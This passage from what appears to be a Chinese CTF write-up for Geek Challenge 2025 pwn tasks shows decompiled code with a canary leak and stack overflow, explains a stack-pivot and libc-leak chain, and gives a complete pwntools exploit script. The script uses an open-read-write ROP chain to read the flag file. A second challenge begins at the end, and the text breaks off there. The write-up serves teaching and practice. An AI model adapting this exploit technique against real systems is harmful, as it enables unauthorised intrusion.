<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">sandbox</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sandbox</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">seccomp_init</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;seccomp_init failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">60LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">seccomp_load</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;seccomp_load failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">seccomp_release</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">seccomp_release</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">tip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[1;31m[!]The transponder couldn&#39;t connect to the ES node!</span><span class="se">\x1B</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[3mOur company&#39;s purpose is to serve the happiness of all mankind</span><span class="se">\x1B</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Switching to debug mode...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">repeater</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-30h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;data:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span>                        <span class="c1">// leak canary
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;logs:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200uLL</span><span class="p">);</span>                       <span class="c1">// stack overflow
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">repeat_error</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;data:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>首先这个题保护开的很满，还有sandbox
现在repeater里的printf泄露canary和rbp的值，然后下一次read的时候覆盖rbp为原本rbp+0x30的地方
这里把栈迁移过去，可以用之前泄露canary相同的方法泄露main的地址
<img src="/p/geek-challenge-2025-wp/image-12.png"
	width="1445"
	height="511"
	srcset="/p/geek-challenge-2025-wp/image-12_hu_1ff7f83aa4006f1b.png 480w, /p/geek-challenge-2025-wp/image-12_hu_176e00e87a135bc1.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="282"
		data-flex-basis="678px"
	
>
再局部覆写返回地址的低字节回到偏移0x1408的地方再跑一遍repeater
<img src="/p/geek-challenge-2025-wp/image-11.png"
	width="1272"
	height="990"
	srcset="/p/geek-challenge-2025-wp/image-11_hu_141deb6bc58019aa.png 480w, /p/geek-challenge-2025-wp/image-11_hu_41321d06eae395cd.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="128"
		data-flex-basis="308px"
	
>
然后再栈迁移一次rbp到stderr@GLIBC_2.2.5+0x30的地址那里,让printf泄露地址并算出libc基址
<img src="/p/geek-challenge-2025-wp/image-14.png"
	width="1214"
	height="309"
	srcset="/p/geek-challenge-2025-wp/image-14_hu_32ff41960ef0a713.png 480w, /p/geek-challenge-2025-wp/image-14_hu_3254ecd257ef2fe0.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="392"
		data-flex-basis="942px"
	
>
接下来就是libc的orw了</p>
<p>虽然这里其实可以用repeat_error的格式化字符串漏洞，能简单很多，但是看了篇栈迁移的例题和这里很相似，就用了稍微难一点的方法了</p>
<h4 id="exp-5">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io=remote(&#39;geek.ctfplus.cn&#39;,32614)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;data:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">canary</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span><span class="o">-</span><span class="mh">0xa</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">+</span><span class="mh">0x30</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x08</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;logs:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">padding</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;data:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x1484</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">syscall_ret</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="mh">0x11DD</span>
</span></span><span class="line"><span class="cl"><span class="n">stderr</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="mh">0x40a0</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="mh">0x1408</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;logs:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">padding</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;data:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x20a40a</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">open_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">read_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">stderr_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x20a4e0</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000102dea</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000053887</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_xor_eax_eax</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x00000000000d77bd</span>
</span></span><span class="line"><span class="cl"><span class="n">rax</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x00000000000d4f97</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_addr</span><span class="o">=</span><span class="n">stderr</span><span class="o">+</span><span class="mh">0xd0</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_xor_eax_eax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_xor_eax_eax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span><span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;./flag</span><span class="se">\x00</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;logs:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">padding</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mission-ember">Mission Ember
</h3><h4 id="解题流程-6">解题流程
</h4><p>查保护
<img src="/p/geek-challenge-2025-wp/image-4.png"
	width="556"
	height="179"
	srcset="/p/geek-challenge-2025-wp/image-4_hu_2fa13bb9097c98e5.png 480w, /p/geek-challenge-2025-wp/image-4_hu_221a7813f6b3d2c6.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="310"
		data-flex-basis="745px"
	
>
查伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">my_heart</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[1mTry contacting Geek HQ</span><span class="se">\x1B</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">s</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x405000</span><span class="p">,</span> <span class="mh">0x4000uLL</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mh">0x4000uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">Sandbox</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">6uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">((</span><span class="kr">__int64</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">_QWORD</span><span class="p">,</span> <span class="n">_QWORD</span><span class="p">,</span> <span class="n">_QWORD</span><span class="p">))</span><span class="n">s</span><span class="p">)(</span><span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
